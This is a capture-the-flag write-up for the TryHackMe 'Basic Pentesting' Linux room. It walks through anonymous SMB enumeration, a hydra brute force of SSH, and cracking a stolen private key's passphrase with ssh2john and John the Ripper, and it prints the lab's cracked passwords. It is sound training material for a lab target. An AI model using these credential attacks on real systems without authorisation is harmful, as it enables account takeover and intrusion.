---
layout: single
title: "Basic Pentesting"
link: "https://tryhackme.com/room/basicpentestingjt"
parent: TryHackMe
os: Linux
difficulty: Easy
tags: [Smbclient, Hydra, John, SSH]
starred: false
date: 2025-11-08
toc: true
toc_sticky: true
toc_label: "Mission Log"
toc_icon: "crosshairs"
---
# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
{% include ctf-badges.html %}

> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
> **OS:** {{ page.os }} |
> **Difficulty:** {{ page.difficulty }} |
> **Date:** {{ page.date }} |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance
### Nmap Scanning
We realize there is `SMB` and `SSH`.

### Directory Enumeration
 
Using `gobuster` to find directories on the web server. [ *No Luck Here :)* ]

```bash
gobuster dir -u http://<Machine-IP> -w directory-list-1.0.txt -x .php
```

### SMB Enumeration
Listing shares on the SMB server.

```bash
❯ smbclient -L <Machine-IP> -N

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk
```
Connecting to the anonymous share.

```bash
smbclient //<Machine-IP>/Anonymous -N
```
Inside the share, `get staff.txt` was used. The file revealed two user names: Jan and Kay.

## 2. Initial Access
### Brute-forcing SSH (User Jan)
Using `hydra` to crack Jan's SSH password.

```bash
❯ hydra -l jan -P kali-wordlists/rockyou.txt ssh://<Machine-IP>
[22][ssh] host: <Machine-IP>     login: jan     password: armando
```

## 3. Privilege Escalation (to User Kay)

After logging in as Jan, a private SSH key (`id_rsa`) was found in Kay's home directory, and it was readable by Jan.

### Cracking the SSH Key Passphrase

The key was copied and permissions were set.

```bash
chmod 600 id_rsa
```

Attempting to log in with the key revealed it was protected by a passphrase.

```bash
ssh -i ~/.ssh/id_rsa kay@server_ip
```

`ssh2john` was used to create a hash of the key.

```bash
ssh2john.py id_rsa > id_rsa.hash
```

`John the Ripper` was used to crack the hash against a wordlist.

```bash
john --wordlist=rockyou.txt id_rsa.hash
```

The cracked passphrase was: `beeswax`

```bash
beeswax         (id_rsa)
```

### Accessing Kay's Account

Using the private key and the cracked passphrase to log in as Kay.

## 4. Final Flag

Once logged in as Kay, the final password was found in `pass.bak`.

```bash
kay@<Machine-IP>:~$ cat pass.bak
here...cy$$
```

---

{% comment %}

[Technique]: SMB Enumeration
[Command]: smbclient //<IP>/Anonymous -N
[Why]: Connects to SMB share without a password (anonymous login) to retrieve sensitive files.

[Technique]: SSH Brute Force
[Command]: hydra -l jan -P kali-wordlists/rockyou.txt ssh://<IP>
[Why]: Cracks the SSH password for a known username using a dictionary attack.

[Technique]: SSH Key Cracking (John)
[Command]: ssh2john.py id_rsa > hash.txt && john --wordlist=rockyou.txt hash.txt
[Why]: Converts an encrypted private SSH key to a hash format and cracks the passphrase.

{% endcomment %}